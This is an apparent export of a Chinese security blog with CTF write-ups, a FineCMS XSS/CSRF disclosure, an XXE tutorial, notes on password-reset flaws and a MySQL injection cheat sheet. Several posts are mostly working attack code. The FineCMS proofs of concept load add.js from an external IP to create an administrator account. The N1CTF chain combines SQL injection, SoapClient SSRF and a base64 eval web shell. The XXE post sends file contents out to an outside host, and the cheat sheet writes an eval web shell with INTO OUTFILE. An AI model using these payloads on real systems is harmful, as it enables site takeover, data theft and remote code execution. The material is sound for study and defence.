[{"title":"StarCTF2018_SimpleWeb_writeup","date":"2018-04-25T15:43:25.000Z","path":"2018/04/25/starctf2018-SimpleWeb-wp/","text":"如今的Web一点都不纯了:(多多少少都参杂了一点re和pwn…然而只会做这Web第一题:(题目给了nodejs的源码。 1234567891011121314151617181920212223242526272829303132333435363738var net = require('net');flag='fake_flag';var server = net.createServer(function(socket) &#123; socket.on('data', (data) =&gt; &#123; //m = data.toString().replace(/[\\n\\r]*$/, ''); ok = true; arr = data.toString().split(' '); arr = arr.map(Number); if (arr.length != 5) ok = false; arr1 = arr.slice(0); arr1.sort(); for (var i=0; i&lt;4; i++) if (arr1[i+1] == arr1[i] || arr[i] &lt; 0 || arr1[i+1] &gt; 127) ok = false; arr2 = [] for (var i=0; i&lt;4; i++) arr2.push(arr1[i] + arr1[i+1]); val = 0; for (var i=0; i&lt;4; i++) val = val * 0x100 + arr2[i]; if (val != 0x23332333) ok = false; if (ok) socket.write(flag+'\\n'); else socket.write('nope\\n'); &#125;); //socket.write('Echo server\\r\\n'); //socket.pipe(socket);&#125;);HOST = '0.0.0.0'PORT = 23333server.listen(PORT, HOST); 拿到flag的条件是使val最后等于0x23332333。因此我们可以先将0x23332333对0x100循环取余得到arr2。123456789101112var val = 0x23332333var arr2 = []for (var i=0; i&lt;4; i++)&#123; x = val % 0x100 arr2.unshift(x) val = (val - x) / 0x100&#125;console.log(arr2)// arr2 = [35, 51, 35, 51] 注意到源码中的arr1.sort()。在js中，sort方法在排序时是按照ascii码大小来排序的。因此会出现如下怪异的情况：12console.log([3, 25, 100, 6].sort())// [ 100, 25, 3, 6 ] 于是可爆破出满足sort()排序的arr11234567891011121314151617var arr2 = [35, 51, 35, 51]for (var a=0; a&lt;=35; a++)&#123; b = 35 - a c = 51 - b d = 35 - c e = 51 - d if (a==b || b==c || c==d || d==e) continue var arr = [a, b, c, d, e] var arr1 = arr.slice(0) if (arr.sort().toString() == arr1.toString()) &#123; console.log(arr) break &#125; &#125; 得到结果为[ 15, 20, 31, 4, 47 ]","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"FineCMS v5.3.0 XSS/CSRF","date":"2018-03-21T15:00:00.000Z","path":"2018/03/21/finecms/","text":"0x01 版本类型源码信息：FineCMS v5.3.0 bulid 20180206 问题文件：/finecms/dayrui/libraries/Template.php 漏洞类型：反射型XSS、CSRF 0x02 漏洞详情FineCMS后台的管理员管理和会员管理的搜索功能，未进行字符编码与过滤而导致反射型XSS。 在搜索框输入&quot;&gt;&lt;svg/onload=alert(1)//，点击搜索并deBug跟踪数据。 可发现POST参数keyword传进了/finecms/dayrui/controllers/Root.php中的index()方法，并通过$this-&gt;input-&gt;post(&#39;keyword&#39;, TRUE)来获取数值（进行XSS、不可见字符和基于黑名单等等的过滤._.）。 然后送进了$this-&gt;member_model-&gt;get_admin_all()方法进行数据库查询操作（没有可乘之机）。接着通过$this-&gt;template-&gt; display()调用输出模板。 跟踪到输出模板函数/finecms/dayrui/libraries/Template.php中80行的display()方法。 在93行中通过load_view_file方法加载了模板缓存文件，并将缓存文件用include包含。（执行了文件中的php语句） 在缓存文件/cache/templates/finecms.dayrui.templates.admin_index.html.cache.php的33行可以看到，直接执行了echo语句，而$_POST[&#39;keyword&#39;]却是可控的，没有经过任何的过滤和编码。从而造成了反射型XSS。 还有一处原理差不多的反射型XSS在会员管理的搜索框处。 点击搜索，debug跟踪数据，发现POST发送的keyword在/finecms/dayrui/controllers/admin/Member.php的70行被赋值到变量$param中。（跟踪函数$this-&gt;member_model-&gt;limit_page()可知道最终是在/finecms/dayrui/models/Member_model.php中_where()方法的694行被赋值的。）之后没有再对$param进行编码和过滤便执行了$this-&gt;template-&gt;display(&#39;member_index.html&#39;) 同样是在在输出模板函数/finecms/dayrui/libraries/Template.php中的display()方法。在93行中将缓存文件用include包含。（执行了文件中的php语句） 跟踪查看缓存文件/cache/templates/finecms.dayrui.templates.member_index.html.cache.php，可以看到，在43行直接对$param[&#39;keyword&#39;]进行了输出，从导致了另一个反射型XSS。 BTW：添加后台管理员帐号请求并没有附带token值，因此可以直接利用CSRF来添加一个管理员帐号。 0x03 漏洞POC0x01 利用管理员管理处的XSS，构造表单，当管理员访问了如下html，则会在后台添加一个管理员帐号test:123456 123456789&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;form action=\"http://FineCMS的域名或IP/admin.php?c=root&amp;m=index\" method=\"post\" name=\"myform\"&gt; &lt;input type=\"text\" name=\"keyword\" value='\"&gt;&lt;script src=http://115.159.209.191/add.js&gt;&lt;/script&gt;'&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;script&gt;document.myform.submit();&lt;/script&gt;&lt;/html&gt; 0x02 利用会员管理处的XSS。（创建管理员帐号时不能有相同名称或邮箱） 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;form action=\"http://FineCMS的域名或IP/admin.php?c=membe&amp;m=index\" method=\"post\" name=\"myform\"&gt; &lt;input type=\"text\" name=\"data[field]\" value='username'&gt; &lt;input type=\"text\" name=\"data[keyword]\" value='\"&gt;&lt;script src=http://115.159.209.191/add.js&gt;&lt;/script&gt;'&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;script&gt;document.myform.submit();&lt;/script&gt;&lt;/html&gt; add.js12345678function add()&#123; var xmlhttp1=new XMLHttpRequest(); xmlhttp1.open(\"POST\",\"/admin.php?c=root&amp;m=add\",true); xmlhttp1.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); xmlhttp1.send(\"data[username]=test&amp;data[password]=123456&amp;data[email]=a00@qq.cn&amp;data[phone]=123\");&#125;;add(); 0x03 直接利用CSRF，当管理员访问如下html时，将创建一个管理员帐号hacker:123456 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;form action=\"http://FineCMS的域名或IP/admin.php?c=root&amp;m=add\" method=\"post\" name=\"myform\"&gt; &lt;input type=\"text\" name=\"data[username]\" value='hacker'&gt; &lt;input type=\"text\" name=\"data[password]\" value='123456'&gt; &lt;input type=\"text\" name=\"data[email]\" value='random@qq.cn'&gt; &lt;input type=\"text\" name=\"data[phone]\" value='1234'&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;script&gt; document.myform.submit(); &lt;/script&gt;&lt;/html&gt; 成功添加：","tags":[{"name":"Vulnerable","slug":"Vulnerable","permalink":"K4ngx.github.io/tags/Vulnerable/"}]},{"title":"N1CTF2018_Easyphp_WP","date":"2018-03-13T17:03:01.000Z","path":"2018/03/14/N1CTF2018-Easyphp-WP/","text":"划了两天水~ 题目叫做easy php，然而感觉并不easy啊:)。。解题步骤主要是源码审计，sql注入，ssrf，文件上传。。 看了下主要有注册，登录，发表签名和心情，删除签名的功能。 注册和登录页面需要提交验证码: substr(md5($input,0,5))==$captcha getmd5.py123456789101112import hashlib, itertools, stringdef brute(s): for i in range(1,6): for x in itertools.product(string.digits + string.ascii_lowercase, repeat=i): s1 = ''.join(x) if hashlib.md5(s1.encode('utf8')).hexdigest().startswith(s): print(s1) returnwhile(1): s = input() brute(s) 0x01. 通过加~获取到源码:index.php,user.php,config.php等，views/下有login等其他php文件源码。0x02. 通过phpinfo，得到session文件位于../../var/lib/php5/sess_xxxxxx,也可通过获取进程的文件描述符来获取../../proc/self/fd/240x03. 通过源码审计发现user.php中的publish函数处存在insert注入。 我们POST提交的signature和mood参数，未经过滤就传进了insert()函数，在insert函数中，先调用了get_column函数将数组元素用反引号包裹，并用逗号隔开：`signature`,`mood` 。（先在session中获取自己的用户id。 payload1signature=aa`,0x4f3a343a224d6f6f64223a333a7b733a343a226d6f6f64223b693a313b733a323a226970223b733a393a223132372e302e302e31223b733a343a2264617465223b693a313532303636393134353b7d),(116,0x6b6b74657374,(select group_concat(username,0x7e,password,0x7e,ip,0x7e,is_admin) from ctf_users where is_admin=1),0x4f3a343a224d6f6f64223a333a7b733a343a226d6f6f64223b693a313b733a323a226970223b733a393a223132372e302e302e31223b733a343a2264617465223b693a313532303636393134353b7d)#&amp;mood=0 /user.php:publish()12345678910111213141516171819202122232425262728293031function publish()&#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; if(isset($_POST['signature']) &amp;&amp; isset($_POST['mood'])) &#123; $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip()))); $db = new Db(); @$ret = $db-&gt;insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); if($ret) return true; else return false; &#125; &#125; else &#123; if(isset($_FILES['pic'])) &#123; if (upload($_FILES['pic']))&#123; echo 'upload ok!'; return true; &#125; else &#123; echo \"upload file error\"; return false; &#125; &#125; else return false; &#125;&#125; config.php:insert()12345678910public function insert($columns,$table,$values)&#123; $column = $this-&gt;get_column($columns); $value = '('.preg_replace('/`([^`,]+)`/','\\'$&#123;1&#125;\\'',$this-&gt;get_column($values)).')'; $nid = $sql = 'insert into '.$table.'('.$column.') values '.$value; $result = $this-&gt;conn-&gt;query($sql); return $result;&#125; config.php:get_column()123456789private function get_column($columns)&#123; if(is_array($columns)) $column = ' `'.implode('`,`',$columns).'` '; else $column = ' `'.$columns.'` '; return $column;&#125; 0x04. 访问index.php?action=index，得到admin帐号密码为admin:nu1ladmin。然而admin的登录要求为ip为127.0.0.10x05. **源码审计发现Mood类在user.php中的showmess函数中会反序列化并调用，又发现phpinfo中SoapClient开启。搜索一波后，发现可以通过反序列化构建SoapClient对象，构造POST包让服务端请求login页面，造成SSRF。 12345678&lt;?php $a = new SoapClient(null, array('uri' =&gt; '123','location' =&gt; 'http://127.0.0.1/index.php?action=login'));echo serialize($a);?&gt;//We gotO:10:\"SoapClient\":3:&#123;s:3:\"uri\";s:3:\"123\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:13:\"_soap_version\";i:1;&#125; 在CRLF注入的基础上，我们可以得到： 1234567891011121314151617&lt;?php $a = unserialize('O:10:\"SoapClient\":3:&#123;s:3:\"uri\";s:281:\"http://www.ubuntu.com/Content-Length: 0POST /index.php?action=login HTTP/1.1Host: 127.0.0.1Content-Length: 43Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=au4k8id9v05kln2mic004i58q3username=admin&amp;password=nu1ladmin&amp;code=db0ePOST /whatever\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:13:\"_soap_version\";i:1;&#125;');echo $a-&gt;cc();?&gt; 运行nc -lvvp 80来监听80端口。 12345678910111213141516171819202122232425262728293031323334POST /index.php?action=login HTTP/1.1Host: 127.0.0.1Connection: Keep-AliveUser-Agent: PHP-SOAP/5.3.29Content-Type: text/xml; charset=utf-8SOAPAction: \"http://www.ubuntu.com/Content-Length: 0POST /index.php?action=login HTTP/1.1Host: 127.0.0.1Content-Length: 43Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=au4k8id9v05kln2mic004i58q3username=admin&amp;password=nu1ladmin&amp;code=db0ePOST /whatever#cc\"Content-Length: 643&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"http://www.ubuntu.com/Content-Length: 0POST /index.php?action=login HTTP/1.1Host: 127.0.0.1Content-Length: 43Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=au4k8id9v05kln2mic004i58q3username=admin&amp;password=nu1ladmin&amp;code=db0ePOST /whatever\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:cc/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; Apache收到后将识别为三个POST包： 因此，我们可先获取一个新的session，作为admin账户的session，并获取其验证码，生成payload： genPayload.php1234567891011121314151617181920&lt;?php $a = bin2hex('O:10:\"SoapClient\":3:&#123;s:3:\"uri\";s:281:\"http://www.ubuntu.com/Content-Length: 0POST /index.php?action=login HTTP/1.1Host: 127.0.0.1Content-Length: 43Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=au4k8id9v05kln2mic004i58q3username=admin&amp;password=nu1ladmin&amp;code=db0ePOST /whatever\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:13:\"_soap_version\";i:1;&#125;');echo $a;?&gt;//We got//4f3a31303a22536f6170436c69656e74223a333a7b733a333a22757269223b733a3238313a22687474703a2f2f7777772e7562756e74752e636f6d2f0d0a436f6e74656e742d4c656e6774683a20300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6e74656e742d4c656e6774683a2034330d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6175346b386964397630356b6c6e326d696330303469353871330d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6e75316c61646d696e26636f64653d646230650d0a504f5354202f77686174657665720d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31333a225f736f61705f76657273696f6e223b693a313b7d 得到我们的payload，通过已登录的用户X在publish页面中POST。 1signature=aa`,0x4f3a31303a22536f6170436c69656e74223a333a7b733a333a22757269223b733a3238313a22687474703a2f2f7777772e7562756e74752e636f6d2f0d0a436f6e74656e742d4c656e6774683a20300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6e74656e742d4c656e6774683a2034330d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6175346b386964397630356b6c6e326d696330303469353871330d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6e75316c61646d696e26636f64653d646230650d0a504f5354202f77686174657665720d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)#&amp;mood=0 此时访问用户X的index.php?action=index页面。返回状态码500，反序列化成功。 0x06. 以admin的session登录，通过源码发现在publish函数处可upload图片文件 config.php:upload()123456789101112131415161718192021222324252627282930313233function upload($file)&#123; $file_size = $file['size']; if($file_size&gt;2*1024*1024) &#123; echo \"pic is too big!\"; return false; &#125; $file_type = $file['type']; if($file_type!=\"image/jpeg\" &amp;&amp; $file_type!='image/pjpeg') &#123; echo \"file type invalid\"; return false; &#125; if(is_uploaded_file($file['tmp_name'])) &#123; $uploaded_file = $file['tmp_name']; $user_path = \"/app/adminpic\"; if (!file_exists($user_path)) &#123; mkdir($user_path); &#125; $file_true_name = str_replace('.','',pathinfo($file['name'])['filename']); $file_true_name = str_replace('/','',$file_true_name); $file_true_name = str_replace('\\\\','',$file_true_name); $file_true_name = $file_true_name.time().rand(1,100).'.jpg'; $move_to_file = $user_path.\"/\".$file_true_name; if(move_uploaded_file($uploaded_file,$move_to_file)) &#123; if(stripos(file_get_contents($move_to_file),'&lt;?php')&gt;=0) system('sh /home/nu1lctf/clean_danger.sh'); return $file_true_name; &#125; else return false; &#125; else return false;&#125; upload函数将文件名改为filename.time().rand(1,100).&#39;jpg&#39;,然后保存在了/app/adminpic/下，同时对文件内容的进行了检测，若存在&lt;?php，则执行clean_danger.sh。 clean_danger.sh12cd /app/adminpic/rm *.jpg 在phpinfo中，我们可以看到，short_open_tag = Off，但是依然可以使用&lt;?=来执行php代码。 0x07. 上传一个crxxx.jpg crxxx.jpg1&lt;?=file_put_contents(\"/var/www/html/kkzxc123.php\",base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUW2tleV0pOz8+\")); 从服务端返回的时间，转化成Unix时间戳，然后对rand(1,100)进行爆破。即可得到真实文件名。通过index.php?action=xxxx.jpg包含，就生成了/var/www/html/kkzxc123.php。 0x08. 菜刀连接，根据run.sh中数据库密码，可在数据库中拿到flag。 对于另外一题funning eating cms,主要是考察parse_url()存在解析的漏洞，遇到:时，会直接返回false。","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"浅谈XXE漏洞","date":"2018-03-03T18:11:35.000Z","path":"2018/03/04/xxe/","text":"XXE（XML External Entity Injection），即XML外部实体注入。漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。 XML与DTD的关系DTD（Document Type Definition）文档类型定义,一种XML约束模式语言，属于XML文件组成的一部分。 123456789101112131415&lt;!--文档声明--&gt;&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!--DTD--&gt;&lt;!DOCTYPE poem [ &lt;!--定义此文档是 poem 类型的文档--&gt;&lt;!ELEMENT poem (author, title, content)&gt; &lt;!--定义poem元素有三个子元素--&gt;&lt;!ELEMENT author (#PCDATA)&gt; &lt;!--定义author元素为“#PCDATA”类型--&gt;&lt;!ELEMENT title (#PCDATA)&gt; &lt;!--定义title元素为“#PCDATA”类型--&gt;&lt;!ELEMENT content (#PCDATA)&gt; &lt;!--定义content元素为“#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Hello&lt;/head&gt;&lt;body&gt;Hello world!&lt;/body&gt;&lt;/note&gt; DTD文档有三种应用形式。 内部DTD文档： 1&lt;!DOCTYPE 根元素 [定义内容]&gt; 外部DTD文档： 1&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\"&gt; 内外部DTD文档结合： 1&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\" [定义内容]&gt; XXE漏洞原理——XML实体实体主要分为四种: 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 注： 完整实体类别可参考 DTD - Entities 其实，XML可分为普通实体和参数实体。 而根据实体声明方式的不同，还分为内部实体和外部实体，XXE利用的是外部实体。 普通实体引入外部实体1234567&lt;?xml version=\"1.0\" encodinf=\"UTF-8\"?&gt;&lt;!DOCTYPE poem [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; &lt;!--可为file、http、ftp 等等协议--&gt;]&gt;&lt;poem&gt; &amp;xxe;&lt;/poem&gt; 参数实体引入外部实体12345678910&lt;?xml version=\"1.0\" encodinf=\"UTF-8\"?&gt;&lt;!DOCTYPE poem [ &lt;!ENTITY % a SYSTEM \"http://www.test.com/outdtd.dtd\"&gt; &lt;!--可为file、http、ftp 等等协议--&gt; %a; &lt;!--执行outdtd.dtd的内容--&gt;]&gt;&lt;poem&gt;&amp;xxe;&lt;/poem&gt;&lt;!--outdtd.dtd内容--&gt;&lt;!ELEMENT xxe SYSTEM \"file:///etc/passwd\"&gt; 注：外部资源的URI主要支持file、http、https、ftp等协议，对不同的程序所支持的协议不同。 XXE漏洞类型与危害I.任意文件读取通过外部实体引用，实现任意文件读取。 II.URL请求，SSRF 端口扫描，探测内网服务 内网攻击get型payload，如st2命令执行、discuz ssrf通过redis实施getshell；指纹识别等等 DoS拒绝服务：通过实体的递归调用，占用大量服务器资源。 III.远程代码执行在php开启expect扩展的前提下 123456&lt;!DOCTYPE root [ &lt;!ENTITY cmd SYSTEM \"expect://id\"&gt;]&gt;&lt;dir&gt; &lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt; XXE漏洞本地测试任意文件读取构造index.html、func.php和test.txt。index.html构造表单，并转换成XML字符串，发送到func.php转化成XML对象，并输出数据。 /index.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;html&gt;&lt;head&gt; &lt;title&gt;xxe test&lt;/title&gt; &lt;script src=\"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id=\"welcome\" name=\"information\"&gt; &lt;span&gt;Username:&lt;/span&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;br/&gt; &lt;span&gt;E-mail:&lt;/span&gt;&lt;input type=\"text\" name=\"email\"&gt;&lt;br/&gt; &lt;button id=\"post\"&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;script&gt; function form2XML(obj)&#123; let iForm = document.getElementById(obj); let tmp = ''; //获取所有type为'text'的input let aInput = Array.from(iForm.getElementsByTagName('input')).filter(x =&gt; x.type === 'text'); for(v of aInput)&#123; let tagName = tagValue = ''; tagName = v.name; tagValue = v.value; let tTag = `&lt;$&#123;tagName&#125;&gt;$&#123;tagValue&#125;&lt;/$&#123;tagName&#125;&gt;`; tmp += tTag; &#125; let outXML = '&lt;' + iForm.name + '&gt;' + tmp + '&lt;/' + iForm.name + '&gt;'; return outXML; &#125; //发送XML请求 const post_btn = document.getElementById('post'); post_btn.onclick = function()&#123; $.ajax(&#123; url: \"./func.php\", data: form2XML('welcome'), type: 'POST', contentType: \"text\", success: function(data)&#123; document.write(data); &#125;, error: function(xhr, ajaxOptions, thrownError)&#123; console.log(xhr.status); console.log(thrownError); &#125; &#125;); return false; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; /func.php123456789&lt;?php //开启解析XML外部实体功能 //libxml_disable_entity_loader(false); $xml = file_get_contents(\"php://input\"); @$res = simplexml_load_string($xml); echo \"name : \" . $res-&gt;username . \"\\n\"; echo \"email : \" . $res-&gt;email;?&gt; 输入数据点击提交，利用burpsuite进行抓包： 修改XML数据，发包，可读取到test.txt的数据： 利用参数实体取得间接回显对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 客户端发送payload1给Web服务器 Web服务器向VPS获取恶意DTD，并执行文件读取payload2 Web服务器带着回显结果访问VPS上特定FTP或者HTTP 黑客通过VPS获得回显 服务器中构造index.php、xxe.xml和flag.txt。VPS中构造evil.xml、recv.php和data.txt。其中flag.txt为要读取的数据，然后存入data.txt中。 /index.php1234567&lt;?php $testXML = file_get_contents(\"xxe.xml\"); //libxml_disable_entity_loader(false); $xml = simplexml_load_string($testXML); echo \"&lt;pre&gt;\"; print_r($xml);?&gt; /xxe.xml1234567&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=flag.txt\"&gt; &lt;!ENTITY % evildtd SYSTEM \"http://www.ubuntu.com/evil.xml\"&gt; %evildtd;]&gt;&lt;root&gt;&lt;/root&gt; /evil.xml123&lt;!ENTITY % send \"&lt;!ENTITY &amp;#37; data SYSTEM 'http://www.ubuntu.com/recv.php?file=%file;'&gt;\"&gt;%send;%data; /recv.php123&lt;?php file_put_contents(\"test.txt\", base64_decode($_GET['file'])); ?&gt; 访问服务器的index.php,服务器将去请求VPS上的evil.xml并执行，带上flag.txt经过base64加密后的内容去请求VPS上的recv.php，于是将base64解码后的数据存入了data.txt。完成间接回显。 注：若flag.txt的读取不采用php://filter，则当文件内容包含空格换行等，将导致recv.php请求失败。 XXE的防御 禁用外部实体 过滤和验证用户提交的XML数据 不允许XML中含有任何自己声明的DTD 禁止外来引入，如在php中可设置libxml_disable_entity_loader(true) 参考传送门 https://www.ichunqiu.com/open/58939?from=hd https://thief.one/2017/06/20/1/ https://mp.weixin.qq.com/s/ek2I9tshyTG0HvTAHMmdsQ","tags":[{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"K4ngx.github.io/tags/XXE/"}]},{"title":"十类任意密码重置","date":"2018-02-17T07:42:17.000Z","path":"2018/02/17/pwReset/","text":"补天大佬carry_your之前讲解了一个视频，关于任意密码重置的十种姿势。顿时醍醐灌顶，深有感触。放上视频链接https://www.ichunqiu.com/course/59045 0x01 验证码不失效（存在暴力破解可能性）0x02 验证码直接显示在response中0x03 验证码未绑定用户在发送手机号和验证码时，仅对验证码是否正确进行了判断。未对该验证码是否与手机号匹配进行验证。（即在提交手机号和验证码时可更换成他人手机号通过验证。） 0x04 修改接收的手机或邮箱未对用户名，手机号和验证码三者做统一的验证，仅判断了手机号和验证码是否匹配和正确。 0x05 本地验证的绕过（修改返回包）随意输入验证码，从返回包中将标志值false改为true，从而使客户端误以为验证成功，绕过验证步骤进入密码重置界面。 解决方法：在重置密码处在服务端进行二次验证；在验证中加入token；在session中加入状态值。 0x06 跳过验证步骤对于验证步骤没有做校验，导致可以直接输入最终重置密码的网址达到重置密码的目的。 0x07 未检验用户字段值在设置新密码步骤时，缺少对操作用户的身份判断，导致可通过修改数据包内的用户身份来修改他人的密码。 0x08 修改密码处id可替换类似与上一种。在修改用户密码时，通过id字段来修改用户密码，执行了类似update user set password=&#39;qwe123456&#39; where id=&#39;1&#39;的sql语句。 0x09 cookie值可替换在重置密码的最后一步仅判断了唯一用户标志cookie是否存在，未判断该cookie是否有通过之前的验证流程。导致可以通过替换cookie来修改他人密码。（目标用户cookie可通过第一阶段来获取） 0x0A 修改信息时替换隐藏参数（精）在执行修改个人信息的sql语句的时候，用户的密码也当作字段执行了，且根据隐藏参数loginId来执行。只要在修改信息的POST数据包中添加或替换成他人的loginId和对应的值，即可修改他人密码。（参数名一般可在页面中找到）","tags":[{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"}]},{"title":"浅谈SQLi","date":"2018-02-06T09:51:43.000Z","path":"2018/02/06/SQLi/","text":"(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注 报错注入 宽字节注入 堆叠注入 0x02 MySQL常用函数字符串连接 concat(str1, str2, str3...) concat函数连接一个或者多个字符串，若其中一个为null，则返回null. concat_ws(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符可以是一个字符串，也可以是其它参数。若分隔符为 NULL，则结果为 NULL。函数会忽略任何 str 参数中的 NULL 值。 group_concat([DISTINCT] 字段名 [Order BY 某字段 ASC/DESC] [Separator &#39;分隔符&#39;]) 将某个字段的值连接起来，默认’,’为分隔符，可与group by一起使用。 字符串截取 mid(column_name, start [,length]) start起始为1；length若省略则返回剩余文本。mid函数仅MySQL支持。 substring、substr与mid用法相同 left(string, n) 指定左部截取n个字符。right()为右部截取n个字符，参数同left。 ascii()返回的字符的ascii码值。ord()相比还适用于多字节字符。 regexp查找flag开头的字符串：select flag from flag where flag regexp &#39;^flag&#39; 0x03 sql注入类型a.常用查询12345select database();select group_concat(schema_name) from information_schema.schemata;select table_name from information_schema.tables where table_schema='ctf20xx';select COLUMN_NAME from INFORMATION_SCHEMA.Columns where table_schema='ctf20xx' and table_name='flag';select * from mysql.user; b.联合查询通过闭合语句引号或括号，使用union来查询所需内容。需要相同字段。可用select 1,2,3或order by 3来测试字段数。 c.布尔盲注 2*1e308大法：-1&#39;and(select(select(flag)from(flag))like binary 0x4625)*2*1e308# substr和ascii：ascii(substr((select database()),1,1))=98# if盲注：aaa&#39; and if((select flag from flag where flag like binary 0x4625),1,0)# d.时间盲注 sleep(second)：if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 benchmark(count, expr)：UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null) FROM (select database() as current) as tb1; e.报错注入 2*1e308报错：aa&#39;and(select(1E308*if((select*from(select(flag)from(flag)limit 1)x),2,2)))# updatexml报错(限制32字符)：-1&#39;and(updatexml(1,concat(0x7e,(select(substr(flag,10))from(flag))),1))# extractvalue报错(限制32字符)：-1&#39;)and(extractvalue(1,concat(0x5c,(select(flag)from(flag)))))%23 以下技巧高版本未成功： exp报错：-1&#39;and(exp(~(select*from(select(flag)from(flag))a)))# geometrycollection报错：-1&#39;and(geometrycollection((select*from(select*from(select(flag)from(flag))a)b)))# polygon报错：-1&#39;and(polygon((select*from(select*from(select(flag)from(flag))a)b)))# multipolygon报错：-1&#39;and(multipolygon((select*from(select*from(select(flag)from(flag))a)b)))# multipoint报错：-1&#39;and(multipoint((select*from(select*from(select(flag)from(flag))a)b)))# multilinestring报错：-1&#39;and(multilinestring((select*from(select*from(select(flag)from(flag))a)b)))# linestring报错：-1&#39;and linestring((select * from (select * from (select user())a)b)) 以下技巧高版本中未测试： bigint超出范围：select !(select * from (select user())x) - ~0 mysql重复特性：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 计数重复报错/bug?：select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 上一条技巧的懵逼形式：select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2)) f.导入导出操作 load_file导出文件： 1select 1,2,load_file('/etc/passwd'); into outfile写入文件： 1select \"&lt;?php eval($_GET['key']);\" into outfile '/var/www/html/evil.php'; into outfile 后可跟lines terminated by 0x...(参考sqlmap os-shell)。以16进制内容结尾，而不是&#39;\\r\\n&#39;： 1select * from * limit 0,1 into outfile '/var/www/html/evil.php' lines terminated by 0x.....; into dumpfile写入二进制。into outfile写入文本文件。 